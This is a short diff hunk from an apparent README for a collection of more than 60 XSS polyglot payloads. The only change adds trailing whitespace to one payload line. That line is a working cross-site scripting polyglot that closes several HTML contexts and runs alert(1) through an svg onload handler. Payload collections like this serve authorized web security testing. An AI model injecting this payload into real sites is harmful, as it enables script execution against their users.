@@ -6,7 +6,7 @@ A collection of 60+ polyglot payloads designed to work in multiple contexts incl
 
 1. **Basic Alert Polyglot**
    ```javascript
-   javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+   javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> 
    ```
 
 2. **Multi-Context Polyglot**
